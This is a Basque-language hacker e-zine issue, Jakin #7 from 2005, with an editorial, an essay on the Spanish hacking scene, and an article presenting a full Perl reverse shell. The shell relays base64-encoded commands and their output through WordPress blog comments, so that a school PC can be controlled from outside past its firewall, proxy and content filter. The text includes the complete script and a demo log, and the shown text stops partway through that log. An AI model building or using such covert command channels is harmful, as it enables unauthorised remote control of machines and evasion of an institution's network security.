<jakin>                                                                                
                                                                                
        JJJJJJJ     ´AAAAAAAAAAA`    `KKKK´ KKKKKK´     111  `NNNNNN´  `NNNNNN´ 
        `JJJJJ´     AAAAAAAAAAAAA     KKKK  KKKKK      1111    NNNNN    NNNNN 
         JJJJJ     AAAAAAAAAAAAAAA    KKKK  KKKK      11111    NNNNN    NNNN  
         JJJJJ   ´AAA´ AAAAAAA `AAA`  KKKK kKKK    11111111    NNNNNN   NNNN  
         JJJJJ        AAAAAAAAA       KKKK,KKK        11111    NNNNNNN  NNNN  
         JJJJJ        AAAA'AAAA       KKKKKKK         11111    NNNNNNNN`NNNN  
         JJJJJ       AAAA´ `AAAA      KKKKKKK         11111    NNNNNNNNNNNNN
 JJJJJJ, JJJJJ      AAAAA   AAAAA     KKKKKKKK        11111    NNNNN`NNNNNNN  
 JJJJJJ  JJJJJ     AAAAAA   AAAAAA    KKKK KKKK       11111    NNNNN NNNNNNN  
 `JJJJ   JJJJJ     AAAAAAAAAAAAAAA    KKKK  KKKK      11111    NNNNN  NNNNNN  
  JJJJj,jJJJJJ    AAAAAAAAAAAAAAAAA   KKKK  KKKKK     11111    NNNNN  `NNNNNN 
  `JJJJJJJJJJj    AAAAAAA   AAAAAAA   KKKKk `KKKKKK   11111    NNNNN   NNNNNN
    JJJJJJJJJ´   AAAAAAAA   AAAAAAAA  KKKKK  KKKKKKK  11111   NNNNNN   NNNNNNN
                                                                                
                   e         z        i        n        e	

   +----------------------------------------------------------------------+
   | 7. alea (Balioa: 173k)                                               |		
   |----------------------------------------------------------------------|
   | 2005/11/19                                                           |
   |----------------------------------------------------------------------|
   |                                                                      |
   | Segurtasun elektronikoari buruzko fanxina, euskera hutsez            |
   |                                                                      |
   |----------------------------------------------------------------------|
   |                                                                      |
   | Parte hartzaileak: edit,niuBAI, Regexp, Espoz&Mina, km,              |
   |                    Joxean Koret, keepalive, NH                       |
   |----------------------------------------------------------------------|
   | email helbideak: jakinezine@euskalerria.org                          |
   |                 jakin@kaixo.com                                      |
   |		         jakinezine@gmail.com                                 |
   |----------------------------------------------------------------------|
   | Web helbidea:  http://www.jakin.tk                                   |
   |		        http://jakin.sf.net                                   |
   |                                                                      |
   +----------------------------------------------------------------------+
 
    
                               Ale honetan

   +----------------------------------------------------------------------+
   | Zb  |                    Izenburua               | Egilea            |
   |----------------------------------------------------------------------|
   |0x00 |  Hitzaurrea                                |  edit             |
   |----------------------------------------------------------------------|
   |0x01 |  Scene? 2                                  |  edit             |
   |----------------------------------------------------------------------|
   |0x02 |  Alderantzizko shell bat wordpressekin     |  Regexp           |
   |----------------------------------------------------------------------|
   |0x03 |  Honeypot bat idazten Python-egaz          |  Joxean Koret     |
   |----------------------------------------------------------------------|
   |0x04 |  Unix programazioa: Ncurses adibideak      |  Espoz&Mina       |
   |----------------------------------------------------------------------|
   |0x05 |  TCP/IP programazioa (VII)                 |  niuBAI           |
   |----------------------------------------------------------------------|
   |0x06 |  Router Ordorika: Cisco IOS sesioa         |  keepalive        |
   |----------------------------------------------------------------------|
   |0x07 |  NASM programazio lengoaia                 |  napharhack       |
   |----------------------------------------------------------------------|
   |0x08 |  BASH scripting                            |  Espoz&Mina       |
   |----------------------------------------------------------------------|
   |0x0A |  Kultura                                   |  km               |
   |----------------------------------------------------------------------|
   |0x0B |  Albisteak,Estekak,Agurrak                 |  edit             |
   |----------------------------------------------------------------------|
   | +...........++....+ gpg gakoa                                        |
   +----------------------------------------------------------------------+



                                                                             
                                                                               

     "honeypot"

Informazio sistemetan debekatutako sarrerak harraptu eta isladatzeko tranpa
bereziak. Eztipotoak.



(((((((((((((((((((((((((((((((((((( Jakin dezagun!! ))))))))))))))))))))))))))))))))))))))


<0x00>
                        Hitzaurrea
                       ____________


Hemen gaude berriz ere. Nabaritu duzuen moduan itsuraldaketa batzuk jasan
ditu ezineak batez ere diseinuaria dagokionean. Batetik izenburuaren diseinu
aproposagoa jarri da eta bestetik artikuluen zanbakitzea oinarri hamaseitarrean
jarri dugu ezineen tradizioari atxekituz.
Edukin aldetik pixkanaka geroz eta zabal eta handiagoa egiten ari da. Agian 
ale hau zatika eman behar genuen beste ezine askok egiten duten bezala. 

7. aleak denbora asko behar izan du interneteratzeko. Izan ere artikulu gehiago
sartzeko asmoa genuen, horietariko bat elkarrizketa; baina denbora falta, hackmeetinga,
e.a... batek daki, azkenean hurrengo ale baterako uztea erabaki dugu.
Edukinetan: beste horrenbeste, arlo berriak sartzeko asmoa genuen, baina 
horrek ezinearen kaleratzea atzeratuko zuen eta azkenean kriston iraultza egin
ordez (artikulu mordoak, gai berriak) abiadura murriztu egin da. 

Hala ere 7 artikulu tekniko bildu ditugu oraingo honetan, inoiz baino gehiago;
batzuk ezagunak egingo zaizkizue: unix programazioa, tcp/ip programazioa, nasm,...
Eta beste batzuk guztiz berriak dira: honeypotak eta alderantzizko shell-ak kasu.
Honeypot-en kasuan material mordoa dago beraz aparte jarri dugu http://jakin.sf.net
webgunean jeisteko. Egileak bidali zigun bezala zintzilikatu dugu. Bide batez,
mila esker Joxean. 

Joxean Koret jaunak ohar bat jarri du kaleko euskera erabiltzen duela adieraziz;
jakin ezazue horrek ez duela inongo arazorik suposatzen, gure ustez euskalkien
erabilerak ezinea aberastuko du eta azken finean gure hizkuntzaren izaera ere
isladatuko du.

Esan bezala ale honetan elkarrizketa bat sartu nahi genuen; hurrengoan baietz
atera ;). Mila esker zuei ere izan duzuen pazientziagatik.

Azken hilabete hauetan berri interesgarri mordoa egon da, batez ere ezineei
dagokionez. Berpizteen urtea izan da hau. Albiste ataleari begirada bat botatzea
pena merezi du; hortxe jakingo duzu ze demontre den "Izotz Beltza".

Hasteko, scene2 izeneko artikulua; probokazio hutsa? zuek erabaki.

Gertu?
bagoaz!

             -edit-
</0x00>




<0x01>
                          Scene? 2
                        ____________

2003/12/12 Jakin#2:
"Hemendik urte batera artikulu hau berregingo dut eta ikusiko dugu ea gauzak bilakatu diren."

Bueno, ia bi urte pasa dira.
Gauzak ez dira asko aldatu. Batere, esango nuke.
Horregatik azken hamarkadari begirada bat botako diot.

Espero dut eritzi artikulu honekin inor ez haserretzea. Hausnarketa pertsonala
besterik ez da, eta dakidanez behin baino gehiagotan eztabaidatu da honetaz.
Jakin-en idatzi dutenek ez dute honekin ados egon beharrik.

UNDERaren IGOERA
----------------

Joan den mendeko azken 5 urteetan estatu mailan under inguruaren iraultza
gertatu zen: ezineak (SET, netsearch, 7a69,..), taldeak (H!,jff,..) eta
gertaera pila bat egon ziren (crackdown eta guzti). Interneten burbuilarekin
batera puztutzen joan zen.

Aipagarriak dira oso urte horien bi ondorio: UNDERCONen ospaketa eta birusen
arloan 29A ezinearen sorrera (egun munduko birus sortzailerik onenak biltzen
dituena). UNDERCON-a urtero Murtzia aldean ospatzen den KONgresu bat da, non
estatuko 1337ea biltzen den; bertan H/C/P/V gaiak jorratzen dira eta jendeak
lan "propioak" aurkezten ditu. Bertara joateko gonbidapen sistema berezia
dago eta ez da irekia. Ez da iragarpenik jartzen (ez behintzat antolatzaileen
partetik).

Mugimendu horren barruan denetarik zegoen (ezine eta "hacker" pila atera ziren),
eta horien artean gure lurraldeko jendea bazegoen noski. Tamalez mugimendua
moda bat bezala ere ikusten zen, eta moda guztiak bezalaxe pasatu zen.
Dena den jende asko "desagertu" bada ere ezineak bizirik diraute, agian
ez espero den kalitatearekin baina hortxe daude. Jendea heldu egin da edo
enpresa pribatuetan dago.

Under-aren ilunabarrean mugimendu berriak sortu ziren: hacklab-ak eta
hackmeeting-ak (modak beti Italiatik datoz xDD) eta wifi teknologiaren
inguruko Wireless talde lokalak. Lehengo biei "cyberhippiak" deitzea aproposa
iruditu zait.



CYBERHIPPIAK
------------

80en hamarkadaren cyberpunk-aren ostean, azkeneko bosturtekoan informatika
alternatiboaren belaunaldi berria jaio da: cyberhippiak.
Ideia ezkertiarrak krisialdian sartzen diren neurrian, jendeak bide berriak
bilatzen ditu mundua aldatzeko grinari eusteko. Software librea, kopyleft-a,
pribazidade eskubideak heuren banderak dira. Bai, sindominio estiloko
mugimendutaz ari naiz, edo oro har "hacktivismo" deritzona.

Teknikoki oso prestaturik ez baldinbadaude ere, teknologia bereganatzen saiatu dira
ideiak zabaltzeko bide egokia delako eta ez dute aukerarik galdu: ongi egina!!
Argi dago komunikazioei eskerrak denok presentzia berdin-berdina daukagula munduan.
Hori kristona da, eta horren adibide argi bat Indymedia da zalantzarik gabe.

Nabaritzen zaion errore bakarra hacker hitzaren gehiegizko erabilera da, ez besterik.
Hacker hitza bereganatzen dute eta bere manifestu ta webgune guztitatik ikus dezakegu,
osorik eta aurrizki bezala.
Baina etzazu pentsa sindominio eta antzekoen kontra gaudenik, ezta gutxiagorik ere;
Holako metataldeak behar-beharrezkoak dira eta bere lana benetan txalogarria da.

Gainera gure 255 departamentuak (broadcast), bere webgunetan ale berrien abisua
emateko ohitura du. Jakin-en kasuan ahalik eta leku gehienetan iragarri behar da
ohiartzuna ahalik eta urrutien heltzeko; euskaldun gutxi gaude, Lertxundik zioenez:

Zenbat gera? 4? 1? 3, 5, 7.... xDDD

Tamalgarria da bestalde hacklab eta orohar hacktibismoak jasaten dituen erasoak,
ustezko "hax0r"en partetik. Sindominioko zerbitzaria hackeatua izan da 
http://www.librezale.org/foroa/viewtopic.php?id=840
eta mugimendu honen inguruko jende ezaguna ikusmiran dago:
http://www.trendmicro.com/vinfo/virusencyclo/default5.asp?VName=WORM_XIPI.A

Eraso hauen arrazoiak? whitehat blackhat etengabeko guda, eta zalatzarik gabe:
politika.


"Hackeatzea politikoa da"
-------------------------

http://www.obn.org/hackers/text4.html
Webgunetan hacktibistetan holako esaldiak dituzten dokumentuak irakur daitezke.

Egia esan dena da politika, politikaz pasatzea ere bai, baina holako baieztapenekin
ez al dira gauzak nahasten? Jakin#1-en "hacker" hitzaren definizio bat eman genuen
hiztegi batetik hartuta. Definizioak ez zeukan zerikusirik Jargon filekoarekin, ezta
wikipedian modu luzeagoan irakur daitekenarekin. Kritikak jaso genituen definizio
"penagarri" hori sartzeagatik (arrazoi osoz) baina onartu beharko da probokazio punttu
bat ere bazeukala. Jakin ezinea osatzen dugunontzat hacker hitza, bere zentzurik
onenean (Jargonekoa!), eguneroko helburua da, eta ez erreztasunez banatzen den
titulua. Gaztelaniaz esaten den bezala "al pan pan y al vino vino".

Politika. Hitz arriskutsua gure lurraldean. Gure lurraldean edo gure aberrian? xDD
Ezinean ez dago politikarik, baina ez beldurrik daukagulako baizik eta gure interesak
beste batzuk direlako: ikastea, teknikoki prestatuagoak egotea. Politika nahi duenak
beste aukera asko dauzka: sindikatoak, partiduak, ikasle taldeak e.a. aspertzeko adina.
Baina Jakin ezinea segurtasun informatikoaz dihardu, eta kitto. Software libre putamadre da,
kopyleft-a itzela da, noski; denok bakezaleak garen bezala.

Horregatik JakiOS-n X-evian antzera dokumentazio mordoa sartuko da, baina ez da alephandriaren
estilokoa izango. Guztiz teknikoa izango da. 


Jomugak
-------

"Orduan zertarako ezine hau?" galdetu daiteke berriz
Gutxienez hutsune bat betetzeko eta horretaz gain bere parteideek ikasteko
bide bezala aukeratu dutelako; ezine formatuari eskerrak jende gehiagorekin
ezagutza elkarbanatu daiteke.

Urte gutxi batzuk pasa dira eta lehenengo mugarriak zeharkatu ditugu:
- Bizirik irautea, ez da gauza makala, doan egiten den ezinea baita.
- Kide gehiago lortzea gai gehiago landuz.
- Pixkanaka maila igotzen joatea (oso pixkanaka).

Argi dago ezinea ez dela beste munduko gauza edukinari dagokionean, horregatik
hasiberriak kontsideratzen gara eta gurekin batera jendeak ikas dezan saiatzen
gara. Jarrera horrekin jarraituko dugu beti, ikaslearen jarrera. Lurrazpian.

Epe ertain-luzera handinahi xinplea daukagu: gauza berriak eskeintzea. Horixe
da zailena. Ezkutaturik dauden adituak armairutik ateratzea gustako litzaiguke
baina hori beraien esku dago. Seinaleren bat eman kabroiak! :) (SYN bat behintzat)

Politika egiten saiatzen ez bagara ere, artikulu honetan nahi (gabe?) lokatzan
sartu gara. Ez zen gure asmoa, baina esan bezala politikaz ihes egitea ezinezkoa da.
Honetaz gehiago eztabaidatzeko jo ezinearen posta zerrendara.

Gauza bat ez da bistatik galdu behar: ezine, hacklab, eta mota guztitako taldeak
pertsonaz osaturik daude. Kolektibitasunaren lainoen artean pertsonak ikusteko
ahalegina egin behar da.

Gaizki esanak barkatu, eta ongi esanak ongi hartu, eta beti ere
Jakin dezagun!!


             -edit-
</0x01>



</0x02>





<0x02>
                 Alderantzizko shell bat wordpressekin
                _______________________________________



Regexp Angelorum naiz, aurreko jakin aleetan perl kodea adibideak erakutsi ditut.

Baina...
Gaurko honetan gai ezberdin bat jorratuko dut: alderantzizko shell-a.
Gai honek zeirkusi handia dauka suhesiak sahiesteko teknikekin,  THC taldeak duela
gutxi zenbait paper (irakur) atera ditu honen inguruan. Kasu honetan bere tresna
baten "hobespena?" burutzea proposatuko dut.
Bota begirada: http://www.thc.org/papers/fw-backd.htm


Eskenatokia eta helburua
------------------------

Eskolako linux edo windows bat urrutitik kontrolatu nahi dugu. Baina eskolako sare lokala
eta internet artean router (gutxienez) eta suhesi bat badago:
   ______
  / ____ \
  ||    ||               _________         ______                                   ____
 _||____||_             /        /        /      \                                 |    |
| eskolako |<--------->/suhesia /<------>| router |<-----> ... Internet ... <----->| Ni |_
+__PC_a____+          /________/          \______/                               |________|


Baldintzak
----------

1-Kanpotik ezinezkoa dugu sare lokalean sartzea, portu uztiak itxita daude, ez dago DMZrik ez ezer,
kanpotik ezin gara sartu -> barrurantz. Routerrak ez du helbide-itzulpen edo NATik egiten.

2-Routerran ezin gara sartu. Ez barrutik ezta kanpotik, beraz ezin da administratu eta NAT bat egin.

3-Suhesiak Ez ditu baimentzen kanpotik->barrurantz egiten diren konexioak eta horretaz gain
konfigurazio on bat dauka edozein portu ez baimentzeko. Kanpotik datozen paketeak barrutik 
hasitako konexio baten itzulera direnean solik baimentzen dira.

4-Eskolako PCtik ezinezkoa da zuzenean internetera konektatu. Proxy bitartez konektatu daiteke 
nabigatzeko baina besterik ez. Ezin du bere kabuz portu bat ireki.

5-Proxyak edukin filtro bat dauka: programa kodea, shell aginduak,e.a. topatzen baditu ez ditu pasatzen
utziko. s21sec-en HIVE produktuaren antzeko zerbait.

6-Are gehiago: routerraren IP helbidea dinamikoa da.

Baldintza gogorrak ezta? zorionez, normalean ez dira horren latzak izango, gehienetan neurri barregarriak
egoten dira eskoletan. Bueno ba: hemen aipaturiko neurri horien gainetik pasatuz kanpotik barruko makina
bat kudeatu daiteke. Nola?

Gura alde daukagun bakarra zera da: eskolako PCaren kontrola daukagu eskolan gaudenean, eta 
nahi dugun programa instala dezakegu. Baina kanpotik ezin da atzitu. Irtenbide bakarra dago: 
Eskolako PCa bera izan beharko da kanporantz konektatuko dena gure makinara! 

Eskolako PCa bezero moduan kanpo zerbitzari batetara konektatu behar da, eta gu, zerbitzari 
horren bitartez eskolako PC-ra helduko gara. Konexio hasieraren norantza aldatzen ari gara
azken finean. Horixe da reverse-shell-aren ideia.

Honekin ez dugu ezer berririk esaten noski, hurrunago joango naiz.

Artikuluetan esaten da kanpoko makina hori hackerraren menpe egon behar duela. Kasu askotan
proposatzen dena da kanpo makinan tcp portu bat irekitzea zerbitzari edo p2p moduan eskolako bezeroa
konekta dadin. Portuaren arabera <1024 bada root baimena beharko dugu; baina horretaz gain gerta 
daiteke portu hori eskolatik atziezina izatea. Baldintza gogorretan eskolako pcak ez du aukerarik izango 
berak zuzenean kanpo portuak irekitzeko.


Irtenbidea: Wordpress shell anonimoa
------------------------------------

Irtenbidea nolabait aginduak web baten bitartez pasatzea da. Web orri batean bezeroak espero duen
formato batean aginduak jartzen ditugu, eskolako PCak web bezero bezala ez dauka arazorik aginduak
jasotzeko. Modu egoki bat aginduak zintzilikatzeko weblog bat da. 

Teknika hau ez da berria, ohizkoa da bestelako zerbitzuak kodea jartzeko erabiltzea (news zerbitzua adibidez),
kasu honetan weblogek egun duten kriston hedapenaz baliatuko gara. Wordpress aukeratu dugu baina beste
edozein izan daiteke. Ideia da wordpress-en sarreretan iruzkinak sartzea da:
1. Edozein sarrera edo albistean iruzkina (comment) sartzen da ID batekin.
2. Bezeroak agindu hori jaso eta egikaritzen du.
3. Bezeroak aginduaren irteera ere iruzkin bitartez erantzuten du ID+bezero batekin
4. Aginduaren irteera ikusita, agindu gehiago bidaltzen dira ID+1 batekin
5. e.a...

/Abantailak eta hobespenak/

+ Aginduak ematen dituen makina ez da gurea, ez dauka zerikusirik gurekin.
+ Aginduak web bitartez ematen badira, modu anonimoan eman daitezke, proxy edo
wireless baten bitartez.
+ Eskolako PCak ez du inolako trabarik edukiko.
+ Iruzkin guztiak zifratuta edo kodetuta (base64) sar daitezke, horrekin edukin
filtroak iragazten dira (teknika ezaguna) edukina [a-zA-Z0-9] delako.
+ Weblog batetik bestera jauzi egin daiteke aginduak emateko.
+ Wordpress-en erabilpen legala egiten da. Berdin da wordpress eguneratua egon ala ez.
+ Teknika berdina edozein blog, guestbook edo dena delakoarekin egin daiteke.


/Desabantailak/ 

- wordpress-ek ez digu utziko 15 segunduoro baino idazten. blog batetik bestera jauziz
konpon daiteke.

- Ezin dira agindu berdinak errepikatu. Workaround: hutsuneak sartu edo "&& echo OK" agindua
gehitu.

-Wordpressen iruzkin anonimoak onartu behar dira. Workaround: kontu legal bat sortzea.

Hona hemen kodea. Asko hobetu daiteke, dena den hau POC besterik ez da.
Modu lokalean probatu da eta badabil.

-----------------------8<---------------------------------------------------------

#!/usr/bin/perl -w

# wp-shell.pl - Regexp - Jakin ezine 7
# THC-n azaltzen den reverseWWW shell bat, baina egoera
# okerrenetan ere firewall, proxy eta edukin zelatariak
# engaina ditzake. Wordpress-en erabilpen legala egiten
# du eta unix aginduak base64 kodeketaren bitartez izkutatzen da.


#  Behar ditugun moduluak
use MIME::Base64;
use LWP::UserAgent;
use HTTP::Request;
use HTML::LinkExtor;
use HTTP::Headers;
use HTML::LinkExtor;
use URI::URL;
use HTTP::Request::Common qw(POST);

# Hemen aldagaiak izendatzen ditugu. Argitasunagatik, ez besterik
my $armiarma;           # web bezeroa
my $goiburuak;          # HTTP protokoloaren goiburuak (eskaerarako)
my $url;                # URL (objektua)
my $eskaera;            # HTTP request objektua
my $erantzuna;          # zerbitzariaren erantzuna (orria ala errorea)
my $helburua;           # Helburu helbidea
my $kontagailua = 0;    # Shell-aren agindu kontagailua
my $prompt = "wp-shell";# Shell aginduaren identifikazioa
my $agentea = "wp-shell-/0.1";  # Web zerbitzariari bidalitako nabigatzaile izena
my $referer = "http://www.jakin.tk";    # Web zerbitzariari bidalita url jatorria
my $sarreraid;          # Wordpress-en sarrera identifikadorea komentarioak sartzeko
my $modua = "";         # shell modua: maixua ala bezeroa
my $post_helbidea = ""; # sarrerak egiteko post helbidea edo urla

# argumentuak.
if ($#ARGV < 0  ) {
        printf("Argumentu kopurua desegokia: url bat ezinbestekoa da \n");
        die("Erabilera \n ./wp-shell.pl http://wordpresslog/?p=zbkia [maixu] [agindu-id] [prompt]");
} else {
        $helburua = $ARGV[0];
        @temp = split(/\?p=/, $ARGV[0]);
        $sarreraid = $temp[1];
        @temp = split(/\?/, $ARGV[0]);
        $post_helbidea = $temp[0] . "wp-comments-post.php";
        $kontagailua = (defined($ARGV[2]))?$ARGV[2]:0;
        $modua = (defined($ARGV[1]))?$ARGV[1]:0;
        $prompt = "wp-shell";
        printf("wp-shell - OK helburua $helburua eta id $sarreraid\n");
}


# Maixu gakoa sartu bada, bere funtziora goaz.
if ($modua eq "maixu") {
	&maixu();
}

my $bemaitza = "";
my $agindua = "";


# bezero kodea.
while (1) {

    $agindua = "";
    print "[Aginduen zain... ]\n";
    $bemaitza = &jeitsi($helburua);
    $agindua = &bilatu($bemaitza, $kontagailua, "http://" . $prompt . ".com/");

    if ( $agindua ne "") {
       print "Eskatutakoa: [$agindua] " . deskodetu($agindua) . "\n";
       $bemaitza = egikaritu(deskodetu($agindua));
       print "\033[0;36;40m $bemaitza \033[0m";
       print "[OK, orain emaitza wordpress-en idatziko dut. egon pixkat]\n";
       sleep(15);
       &post("Bezeroa","jlrzapatero\@presidencia.gob.es","http://bezero". $prompt. ".com/". $kontagailua   , kodetu($bemaitza));
       $kontagailua++;
    } else {
       print "\n[Agindu berririk ez...] \n";    
       sleep(5);
    }

}


##############################################
################ AZPIERRUTINAK ###############
##############################################

## maixu moduan egikaritzen bada hemendik sartzen dugu
sub maixu {

	print "Wordpress SHELL, irtetzeko exit jarri.\n";
	my $agindua = "";
	my $emaitza = "";
        my $post_emaitza = "";
        my $kont = 0;	

	while (1) {
		print "\n\033[0;35;40mwp-shell\@$helburua [".$kontagailua."]> \033[0m";
		$agindua = <STDIN>;
		chomp($agindua); 
		if ($agindua eq "exit") {
			exit(0);
		} else {
			$post_emaitza = &post("Maixua","jlrzapatero\@presidencia.gob.es","http://". $prompt. ".com/". $kontagailua  , kodetu($agindua));
                        
                        # agindua errepikatuta baldinbadago, abisatu
                        if ($post_emaitza =~ /duplicate/i ) {
                             print " Agindua errepikatuta, idatzi beste modu batean hutsuneak edo echoekin\n";
                             next;
                        }

                        # azkarregi baldinbagoaz...
                        if ($post_emaitza =~ /cowboy/i) {
                             print " [Lotara... azkarregi zoaz]\n zz..zzzZZZZ...\n";
                             sleep(10);
                             next;
                        }


                        # erantzun baten zain geratzen gara
                        while( $emaitza eq "" && $kont <6) {
  			  $emaitza = &jeitsi($helburua);
                          
		   	  $emaitza = &bilatu($emaitza, $kontagailua, "http://bezero" . $prompt . ".com/");
                          if ( $emaitza ne "") {
                            $_ = $emaitza;
			    # Agian wp-ek sartzen ditu <br/>, kendu behar dira!
        		    $emaitza =~ s#<br/>##g;
		            print "\033[0;36;40m". deskodetu($emaitza) ."\033[0m";
                          } else {
                            $emaitza = "";
                          }
                            sleep(5);
                            $kont++;
                        }
                        $emaitza = "";
                        $kontagailua++;
                        $kont = 0;   
		}
	}
}


## jeitsi: programa errekurtsiboa
# web eskaerak egiten ditugu.
sub jeitsi {

        my ($helburu_url) = @_;

	# Gure web armiarma edo agentea sortzen dugu:
	$goiburuak = new HTTP::Headers(Accept => 'text/plain');

	$url = new URI::URL($helburu_url);
	$eskaera = new HTTP::Request(GET, $url, $goiburuak);
	$eskaera->referer($referer);
	$armiarma = new LWP::UserAgent;
	$armiarma->agent($agentea);
	$erantzuna = $armiarma->request($eskaera);

	print "wp-shell> GET $helburu_url ...\n";

	## Zerbitzariaren erantzuna
	if ($erantzuna->is_success) {# arrakasta eukiz gero
        	print "wp-shell> Zerbitzariaren erantzuna: \n";
	        return $erantzuna->content;
	} else { # bestela...
	        return $erantzuna->message; # atera funtziotik
	}

}

# blogan nahi dugun komentarioa bilatu
sub bilatu {
	my ($html, $kont, $gakoa) = @_;
	my $emaitza1 = "";
	my $emaitza2 = "";
	$gakoa = $gakoa . $kont;

	print "[".$kont. "[" . $gakoa . "]" . $prompt ." katea bilatzen]\n";
	$_ = $html;

        s/\s//g;
	($emaitza1,$emaitza2) = m#${gakoa}(.*?)<p>\s*(.*?)\s*</p>#m;

	if ( defined($emaitza2) && $emaitza2 ne "") {
	  print "Emaitza: [" . $emaitza1 . "] eta ["  . $emaitza2 . "]\n";
          return $emaitza2;
        } else {
          return "";
        }

}

# blogan iruzkin berria sartzeko funtziona
sub post {
        my ($author, $email, $url, $comment) = @_;
	my $content = "";

        print "\nGoazen " . $post_helbidea . " \n";
        $ua = LWP::UserAgent->new();
        my $req = POST $post_helbidea,[ author => $author, email => $email, url => $url, comment => $comment , comment_post_ID => $sarreraid];
        $content = $ua->request($req)->as_string;
        print "\nErantzuna\n " . $content . " \n";
        return $content;
}


# aginduak egikaritzeko funtzioa, irteera itzultzen du
# egikaritu
sub egikaritu {
       my ($pasatutako_agindua) = @_;
       my $agindu_irteera = "";

       print "[Pasatutakoa: $pasatutako_agindua ]\n";

       open(AGINDUA,"$pasatutako_agindua|");
       while(<AGINDUA>) {
        $agindu_irteera .= $_;
       }      
       close(AGINDUA);
       return $agindu_irteera;

}


# kodeketa funtzioa
# xinpleena erabiltzen dugu "Base64 encode"
sub kodetu {
        my ($edukina) = @_;
        return MIME::Base64::encode($edukina);
}

# deskodeketa funtzioa
# xinpleena erabiltzen dugu "Base64 encode"
sub deskodetu {
        my ($edukina) = @_;
        return MIME::Base64::decode($edukina);
}

-----------------------8<---------------------------------------------------------

[MAIXU ALDEAN IKUSIKO DENA]

linux# ./wp-shell.pl http://10.0.0.3/wordpress/?p=6 maixu
wp-shell - OK helburua http://10.0.0.3/wordpress/?p=6 eta id 6
Wordpress SHELL, irtetzeko exit jarri.

wp-shell@http://10.0.0.3/wordpress/?p=6 [0]> ls -lh

Goazen http://10.0.0.3/wordpress/wp-comments-post.php

Erantzuna
 HTTP/1.1 302 Found
Cache-Control: no-cache, must-revalidate, max-age=0
Connection: close
Date: Tue, 26 Jul 2005 22:15:49 GMT
Pragma: no-cache
Location:
Server: Apache/1.3.33
Content-Type: text/html; charset=iso-8859-1
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Last-Modified: Tue, 26 Jul 2005 22:15:50 GMT
Client-Date: Tue, 26 Jul 2005 22:15:50 GMT
Client-Peer: 10.0.0.3:80
Client-Response-Num: 1
Client-Transfer-Encoding: chunked
Set-Cookie: comment_author_9c7065c5618d551217189566c54a1f30=Maixua; expires=Sun, 09 Jul 2006 03:35:50 GMT; path=/wordpress/
Set-Cookie: comment_author_email_9c7065c5618d551217189566c54a1f30=jlrzapatero%40presidencia.gob.es; expires=Sun, 09 Jul 2006 03:35:50 GMT; path=/wordpress/
Set-Cookie: comment_author_url_9c7065c5618d551217189566c54a1f30=http%3A%2F%2Fwp-shell.com%2F0; expires=Sun, 09 Jul 2006 03:35:50 GMT; path=/wordpress/


wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
wp-shell> Zerbitzariaren erantzuna:
[0[http://bezerowp-shell.com/0]wp-shell katea bilatzen]
wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
wp-shell> Zerbitzariaren erantzuna:
[0[http://bezerowp-shell.com/0]wp-shell katea bilatzen]
wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
wp-shell> Zerbitzariaren erantzuna:
[0[http://bezerowp-shell.com/0]wp-shell katea bilatzen]
wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
wp-shell> Zerbitzariaren erantzuna:
[0[http://bezerowp-shell.com/0]wp-shell katea bilatzen]
wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
wp-shell> Zerbitzariaren erantzuna:
[0[http://bezerowp-shell.com/0]wp-shell katea bilatzen]
Emaitza: ['rel='externalnofollow'>Bezeroa</a></cite>Says:<br/><smallclass="commentmetadata"><ahref="#comment-84"title="">July27th,2005at12:16am</a></small>] eta [dG90YWwgMjBLCi1ydy1yLS1yLS0gIDEgcm9vdCByb290IDcuOUsgSnVsIDI1IDEyOjIwIHRlc3Qu<br/>aHRtbAotcnd4ci14ci14ICAxIHJvb3Qgcm9vdCAgOTg1IEp1bCAyNSAxMjo0OCB0ZXN0LnBsCi1y<br/>d3hyLXhyLXggIDEgcm9vdCByb290IDcuMUsgSnVsIDI3IDAwOjExIHdwLXNoZWxsLnBsCg==]
total 20K
-rw-r--r--  1 root root 7.9K Jul 25 12:20 test.html
-rwxr-xr-x  1 root root  985 Jul 25 12:48 test.pl
-rwxr-xr-x  1 root root 7.1K Jul 27 00:11 wp-shell.pl

wp-shell@http://10.0.0.3/wordpress/?p=6 [1]>









[BEZEROAN IKUSIKO DENA]

linux# ./wp-shell.pl http://10.0.0.3/wordpress/?p=6 bezero
wp-shell - OK helburua http://10.0.0.3/wordpress/?p=6 eta id 6
Post helbidea:  http://10.0.0.3/wordpress/wp-comments-post.php
[Aginduen zain... ]
wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
wp-shell> Zerbitzariaren erantzuna:
[0[http://wp-shell.com/0]wp-shell katea bilatzen]

[Agindu berririk ez...]

[Aginduen zain... ]
wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
wp-shell> Zerbitzariaren erantzuna:
[0[http://wp-shell.com/0]wp-shell katea bilatzen]
Emaitza: ['rel='externalnofollow'>Maixua</a></cite>Says:<br/><smallclass="commentmetadata"><ahref="#comment-83"title="">July27th,2005at12:15am</a></small>] eta [bHMgLWxo]
Eskatutakoa: [bHMgLWxo] ls -lh
[Pasatutakoa: ls -lh ]
 total 20K
-rw-r--r--  1 root root 7.9K Jul 25 12:20 test.html
-rwxr-xr-x  1 root root  985 Jul 25 12:48 test.pl
-rwxr-xr-x  1 root root 7.1K Jul 27 00:11 wp-shell.pl
 [OK, orain emaitza wordpress-en idatziko dut. egon pixkat]

Goazen http://10.0.0.3/wordpress/wp-comments-post.php

Erantzuna
 HTTP/1.1 302 Found
Cache-Control: no-cache, must-revalidate, max-age=0
Connection: close
Date: Tue, 26 Jul 2005 22:16:09 GMT
Pragma: no-cache
Location:
Server: Apache/1.3.33 
Content-Type: text/html; charset=iso-8859-1
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Last-Modified: Tue, 26 Jul 2005 22:16:10 GMT
Client-Date: Tue, 26 Jul 2005 22:16:10 GMT
Client-Peer: 10.0.0.3:80
Client-Response-Num: 1
Client-Transfer-Encoding: chunked
Set-Cookie: comment_author_9c7065c5618d551217189566c54a1f30=Bezeroa; expires=Sun, 09 Jul 2006 03:36:10 GMT; path=/wordpress/
Set-Cookie: comment_author_email_9c7065c5618d551217189566c54a1f30=jlrzapatero%40presidencia.gob.es; expires=Sun, 09 Jul 2006 03:36:10 GMT; path=/wordpress/
